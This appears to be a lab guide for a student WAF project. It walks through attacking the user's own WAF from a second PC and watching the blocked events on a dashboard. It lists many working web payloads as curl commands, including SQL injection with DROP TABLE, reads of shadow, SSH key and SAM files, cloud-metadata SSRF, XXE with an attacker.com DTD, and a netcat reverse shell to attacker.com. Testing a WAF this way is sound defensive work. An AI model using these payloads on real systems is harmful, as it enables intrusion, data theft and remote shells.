# ⚔️ How to Attack AegisX WAF from Another PC

This guide shows you how to set up a **Red Team vs Blue Team** scenario using two computers on the same network.

## 🏗️ The Setup

- **PC A (Host)**: Runs AegisX WAF, Dashboard, and Nginx. (The Defender)
- **PC B (Attacker)**: Runs Kali Linux, Python scripts, or manual attacks. (The Hacker)

---

## 🔵 Step 1: Configure the Host PC (Defender)

The Host PC needs to allow incoming traffic from the Attacker PC.

### 1.1 Find Your Host IP
1. Open PowerShell on Host PC.
2. Run: `ipconfig`
3. Look for **IPv4 Address** under your active network adapter (e.g., `192.168.1.10` or `10.0.0.5`).
   - **Write this down** - we'll call it `HOST_IP`.

### 1.2 Allow Firewall Access (Critical!)
By default, Windows Firewall blocks incoming connections. You need to allow traffic on the WAF ports.

**Quickest Method (PowerShell as Administrator):**
```powershell
# Allow HTTP traffic (Nginx WAF entry point)
New-NetFirewallRule -DisplayName "AegisX WAF HTTP" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow

# Allow Dashboard traffic
New-NetFirewallRule -DisplayName "AegisX Dashboard" -Direction Inbound -LocalPort 3000 -Protocol TCP -Action Allow

# Allow Simulator UI (if accessing from attacker)
New-NetFirewallRule -DisplayName "AegisX Simulator" -Direction Inbound -LocalPort 8080 -Protocol TCP -Action Allow
```

**Alternative (Manual via GUI):**
1. Search for **"Windows Defender Firewall with Advanced Security"**.
2. Click **Inbound Rules** → **New Rule**.
3. Select **Port** → **TCP** → Specific local ports: `80, 3000, 8080`.
4. **Allow the connection**.
5. Apply to all profiles (Domain, Private, Public).
6. Name it **"AegisX WAF Ports"**.

### 1.3 Start the WAF System
On the Host PC:
```batch
cd D:\REVOX_AI_WAF
start_waf.bat
```

Wait for all services to be healthy (about 30 seconds).

### 1.4 Open the Dashboard (Your Live Feed)
On the Host PC, open your browser:
- **URL**: `http://localhost:3000`
- Navigate to the **Global Attack Map** or **Events Log** tab.
- This is your **SOC (Security Operations Center)** - you'll watch attacks here in real-time!

---

## 🔴 Step 2: Configure the Attacker PC (Hacker)

Now switch to the second computer (Attacker PC).

### 2.1 Verify Network Connectivity
1. Open terminal/cmd on Attacker PC.
2. Ping the Host: `ping <HOST_IP>`
   - Example: `ping 192.168.1.10`
   - ✅ If you get replies → Good!
   - ❌ If "Request timed out" → Check that both PCs are on the same Wi-Fi/network.

### 2.2 Test WAF Access
Open a browser on Attacker PC:
- **URL**: `http://<HOST_IP>/`
- You should see the AegisX welcome page or a simple response.
- **On Host Dashboard**: You'll see a green "Legitimate Traffic" event appear instantly! 🎉

---

## ⚔️ Step 3: Launch Attacks!

Here are 3 methods to attack, from easiest to most advanced.

---

### Method A: Manual Browser Attacks (Easiest)

Simply type these malicious URLs into the browser address bar on the **Attacker PC**. Replace `<HOST_IP>` with your actual IP.

#### 1. SQL Injection 💉
```
http://<HOST_IP>/?id=1' OR '1'='1
```
**Expected Result**: 
- Browser shows **"Request Blocked by AegisX WAF"** page (403 Forbidden).
- Host Dashboard shows `BLOCKED` event with Risk Score **100**.

#### 2. XSS Attack 🔥
```
http://<HOST_IP>/?search=<script>alert('hacked')</script>
```
**Expected Result**: Blocked. Map shows arrow from your country.

#### 3. Path Traversal 📂
```
http://<HOST_IP>/../../windows/win.ini
```
**Expected Result**: Blocked immediately.

#### 4. SSRF Attack 🌐
```
http://<HOST_IP>/?url=http://169.254.169.254/latest/meta-data/
```
**Expected Result**: Blocked (cloud metadata SSRF).

---

### Method B: Using `curl` (Command Line)

For cleaner, faster attacks without browser caching:

```bash
# Legitimate Request (should be ALLOWED)
curl "http://<HOST_IP>/login"

# SQL Injection (should be BLOCKED)
curl "http://<HOST_IP>/?q=UNION SELECT * FROM users--"

# XSS (should be BLOCKED)
curl "http://<HOST_IP>/?name=%3Cscript%3Ealert(1)%3C/script%3E"

# Path Traversal (should be BLOCKED)
curl "http://<HOST_IP>/?file=../../../../etc/passwd"

# SSRF (should be BLOCKED)
curl "http://<HOST_IP>/?target=http://localhost:22"
```

**Watch the Dashboard** on Host PC after each attack!

---

### Method C: Kali Linux Terminal Commands (Penetration Testing)

For penetration testers using Kali Linux, here are exact terminal commands for various attack vectors.

#### Prerequisites (Kali Linux)
```bash
# Ensure curl is installed (usually pre-installed on Kali)
curl --version

# Optional: Install additional tools
sudo apt update
sudo apt install -y python3-pip netcat nmap
pip3 install requests
```

#### Set Your Target
```bash
# Replace with your Host PC IP
export TARGET="http://192.168.1.10"  # <-- CHANGE THIS

# Verify connectivity
ping -c 3 192.168.1.10
curl -I $TARGET
```

---

#### 1. SQL Injection Attacks 💉

**Basic SQLi:**
```bash
# Union-based SQLi (URL Encoded)
curl -v "$TARGET/?id=1'%20UNION%20SELECT%20username,password%20FROM%20users--"

# Boolean-based blind SQLi
curl -v "$TARGET/?id=1'%20AND%201=1--"

# Time-based blind SQLi
curl -v "$TARGET/?id=1'%20AND%20SLEEP(5)--"

# Classic authentication bypass
curl -v "$TARGET/login?username=admin'--&password=anything"
```

**Advanced SQLi (URL-encoded):**
```bash
# URL-encoded UNION attack
curl -v "$TARGET/?q=1%27%20UNION%20SELECT%20NULL,NULL--"

# Stacked queries
curl -v "$TARGET/?id=1';DROP%20TABLE%20users;--"
```

---

#### 2. Cross-Site Scripting (XSS) 🔥

**Reflected XSS:**
```bash
# Basic script injection
curl -v "$TARGET/?search=<script>alert('XSS')</script>"

# URL-encoded XSS
curl -v "$TARGET/?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E"

# Image tag XSS
curl -v "$TARGET/?q=<img src=x onerror=alert(1)>"

# SVG-based XSS
curl -v "$TARGET/?data=<svg/onload=alert('XSS')>"

# Event handler XSS
curl -v "$TARGET/?input=<body onload=alert('XSS')>"
```

**DOM-based XSS:**
```bash
# Hash-based payload
curl -v "$TARGET/#<img src=x onerror=alert(1)>"
```

---

#### 3. Path Traversal & LFI 📂

**Linux targets:**
```bash
# Read /etc/passwd
curl -v "$TARGET/?file=../../../../etc/passwd"

# Read shadow file
curl -v "$TARGET/?page=../../../../etc/shadow"

# Read SSH keys
curl -v "$TARGET/?f=../../../../home/user/.ssh/id_rsa"
```

**Windows targets:**
```bash
# Read win.ini
curl -v "$TARGET/?file=../../windows/win.ini"

# Read hosts file
curl -v "$TARGET/?page=../../windows/system32/drivers/etc/hosts"

# Read SAM database
curl -v "$TARGET/?f=../../windows/system32/config/SAM"
```

**Null byte injection (older PHP):**
```bash
curl -v "$TARGET/?page=../../../../etc/passwd%00.jpg"
```

---

#### 4. Server-Side Request Forgery (SSRF) 🌐

**Cloud metadata attacks:**
```bash
# AWS metadata
curl -v "$TARGET/?url=http://169.254.169.254/latest/meta-data/"

# Google Cloud
curl -v "$TARGET/?target=http://metadata.google.internal/computeMetadata/v1/"

# Azure metadata
curl -v "$TARGET/?dest=http://169.254.169.254/metadata/instance"
```

**Internal network scanning:**
```bash
# Scan localhost
curl -v "$TARGET/?proxy=http://localhost:22"
curl -v "$TARGET/?fetch=http://127.0.0.1:3306"

# Scan internal network
curl -v "$TARGET/?url=http://192.168.1.1:80"
```

**Protocol smuggling:**
```bash
# File protocol
curl -v "$TARGET/?file=file:///etc/passwd"

# Gopher protocol (Redis exploit)
curl -v "$TARGET/?url=gopher://127.0.0.1:6379/_INFO"

# DICT protocol
curl -v "$TARGET/?target=dict://localhost:11211/stats"
```

---

#### 5. Command Injection ⚡

```bash
# Basic command injection
curl -v "$TARGET/?cmd=; ls -la"

# DNS exfiltration
curl -v "$TARGET/?host=test.com; nslookup evil.attacker.com"

# Reverse shell attempt (testing only!)
curl -v "$TARGET/?exec=; nc -e /bin/bash attacker.com 4444"

# Encoded payloads
curl -v "$TARGET/?run=%3B%20whoami"
```

---

#### 6. XML External Entity (XXE) 📝

**Basic XXE:**
```bash
# Send XXE payload via POST
curl -X POST "$TARGET/api/upload" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'
```

**Blind XXE (OOB):**
```bash
curl -X POST "$TARGET/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<data>test</data>'
```

---

#### 7. NoSQL Injection (MongoDB) 🍃

```bash
# Authentication bypass
curl -X POST "$TARGET/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Regex attack
curl -v "$TARGET/?search[$regex]=admin.*"
```

---

#### 8. HTTP Header Injection 📨

```bash
# CRLF injection
curl -v "$TARGET/" \
  -H "X-Custom: test%0d%0aInjected-Header: evil"

# Host header injection
curl -v "$TARGET/" -H "Host: evil.com"

# X-Forwarded-For spoofing
curl -v "$TARGET/" -H "X-Forwarded-For: 1.1.1.1"
```

---

#### 9. Automated Scanning with Python 🐍

**Quick fuzzer script:**
```python
#!/usr/bin/env python3
import requests
import sys

TARGET = "http://192.168.1.10"  # Change this

payloads = [
    "/?id=1' OR '1'='1",
    "/?search=<script>alert(1)</script>",
    "/?file=../../../../etc/passwd",
    "/?url=http://169.254.169.254",
]

print(f"[*] Fuzzing {TARGET}")
for payload in payloads:
    try:
        r = requests.get(TARGET + payload, timeout=3)
        status = "BLOCKED" if r.status_code == 403 else "ALLOWED"
        print(f"[{status}] {payload} -> {r.status_code}")
    except Exception as e:
        print(f"[ERROR] {payload} -> {e}")
```

**Save and run:**
```bash
nano fuzz.py  # Paste the code above
chmod +x fuzz.py
python3 fuzz.py
```

---

#### 10. Using Common Pen-Testing Tools 🛠️

**Nikto (Web scanner):**
```bash
nikto -h $TARGET
```

**SQLMap (SQL injection):**
```bash
sqlmap -u "$TARGET/?id=1" --batch --level=5 --risk=3
```

**Nmap (Port scan):**
```bash
nmap -sV -p 80,443,3000,5000,8080 192.168.1.10
```

**Burp Suite:**
1. Configure Kali browser to use Burp proxy (127.0.0.1:8080)
2. Browse to `$TARGET`
3. Intercept requests in Burp
4. Modify payloads in Repeater tab
5. Send to Intruder for fuzzing

---

### Method D: Automated Simulator (Advanced)

Use the `kali_sim.py` script for batch attacks with spoofed IPs.

#### Option 1: Run Simulator from Attacker PC

**Step 1**: Copy the Script to Attacker PC
- Download `kali_sim.py` from GitHub: `https://github.com/vedantkhangale/NEW_AI_WAF`
- Or copy via USB/network share.

**Step 2**: Install Requirements
```bash
pip install requests flask
```

**Step 3**: Configure the Target
```bash
# Linux/Mac
export WAF_HOST=http://<HOST_IP>
python3 kali_sim.py

# Windows PowerShell
$env:WAF_HOST="http://<HOST_IP>"
python kali_sim.py
```

**Step 4**: Access the Simulator UI
On **Attacker PC**, open `http://localhost:5555` in browser.

You now have a full control panel to launch:
- SQL Injection attacks
- XSS attacks
- Path Traversal
- SSRF
- Traffic floods

#### Option 2: Access Host Simulator

If firewall allows port 8080, you can use the Host's built-in simulator:
- On **Attacker PC**, open: `http://<HOST_IP>:8080`
- Use the web UI to launch attacks directly!

---

## 📺 Step 4: Watch the Live Feed (Defender View)

On the **Host PC**, keep the Dashboard open at `http://localhost:3000`.

### What You'll See:

1. **Global Attack Map Tab**:
   - When Attacker launches attacks, you'll see **animated arrows** from the source location to your location (Pune, India by default).
   - If using spoofed IPs, arrows will come from different countries (China, Russia, US, etc.).

2. **Events Log Tab**:
   - Each attack appears as a row with:
     - Timestamp
     - Source IP
     - Attack Type (SQL Injection, XSS, etc.)
     - Status (🛡️ BLOCKED, ⚠️ ALLOWED, 🚩 FLAGGED)
     - Risk Score (0-100)

3. **Analytics Tab**:
   - **Request Volume Chart**: Updates in real-time showing hourly traffic.
   - **Attack Vector Distribution**: Pie chart showing attack types.
   - **Blocked IPs Table**: Lists all blocked sources.

4. **Inspector Panel**:
   - Click any event in the Events Log.
   - See full HTTP headers, payload, and AI analysis details.

---

## 🎬 Demo Scenario: Maximum Impact

For an impressive live demonstration:

### Host PC Actions:
1. Open Dashboard → Full screen the **Global Attack Map**.
2. Open a second browser tab with **Events Log** visible.

### Attacker PC Actions:
1. Access the simulator: `http://<HOST_IP>:8080` or run `kali_sim.py` locally.
2. Select **China** as the source country.
3. Pick **SQL Injection** attack type.
4. Click **"Launch Batch (10x)"**.

### What Happens:
- **Dashboard**: 10 red arrows shoot from **Shanghai, China** to your location.
- **Events Log**: 10 blocked attacks appear with risk scores 95-100.
- **Analytics**: Charts update showing spike in blocked threats.

Repeat with different countries (Russia, Brazil, Germany) for a global attack simulation!

---

## 🛡️ Troubleshooting

### "I can't access the WAF from Attacker PC"

**Possible Causes:**
1. **Firewall not configured**: Redo Step 1.2 carefully on Host PC.
2. **Wrong IP**: Double-check `ipconfig` output. Use the IP from your active adapter.
3. **Different networks**: Ensure both PCs are on the **same Wi-Fi or Ethernet network**.
4. **Network isolation**: Some networks (public Wi-Fi, corporate) block device-to-device communication.

**Quick Test:**
```powershell
# On Attacker PC
telnet <HOST_IP> 80
```
If connection succeeds, firewall is open. If it fails, firewall is blocking.

---

### "Simulator says 'Connection Refused'"

**Fix:**
1. Verify `WAF_HOST` or `TARGET_URL` environment variable is set correctly.
2. Test basic connectivity first: `curl http://<HOST_IP>/`
3. Check Host PC Docker containers are running: `docker ps`
4. View WAF logs for errors: `docker logs aegisx-waf-engine`

---

### "All Attacks Show ALLOWED Instead of BLOCKED"

**Possible Issues:**
1. **WAF Engine not running**: 
   ```bash
   docker-compose restart waf-engine
   ```
2. **AI Service failed**: Check `docker logs aegisx-ai`
3. **Signatures disabled**: Verify `decision_engine.py` has signature checks enabled.

---

### "Dashboard Shows No Events"

**Fixes:**
1. **WebSocket not connected**: Refresh the dashboard page.
2. **Backend API down**: Check `http://localhost:5000/api/recent-events` on Host PC.
3. **CORS issue**: Ensure WAF Engine CORS allows `localhost:3000`.

---

## 📊 Understanding the Results

### Attack Status Indicators:

| Icon | Status | Meaning |
|------|--------|---------|
| 🛡️ | BLOCKED | Attack stopped, no harm done |
| ⚠️ | ALLOWED | Traffic passed through (should be legitimate) |
| 🚩 | FLAGGED | Medium risk, queued for human review |

### Risk Score Guide:

- **0-30**: Legitimate traffic
- **31-69**: Suspicious, flagged for review
- **70-100**: Malicious, auto-blocked

---

## 🎓 Educational Use

This setup is perfect for:
- **Cybersecurity courses**: Demonstrate WAF capabilities.
- **Penetration testing practice**: Safe, controlled environment.
- **Team training**: Red Team vs Blue Team exercises.
- **Academic projects**: Final year projects, research demos.

**Legal Note**: Only attack systems you own or have explicit written permission to test. Unauthorized attacks are illegal.

---

## 🚀 Next Steps

Once you've mastered manual attacks:
1. **Write custom attack scripts** in Python using `requests`.
2. **Try bypassing the WAF** with obfuscation techniques.
3. **Study the AI model** to understand what it detects.
4. **Contribute attacks** to improve signature detection.

Happy ethical hacking! 🛡️⚔️
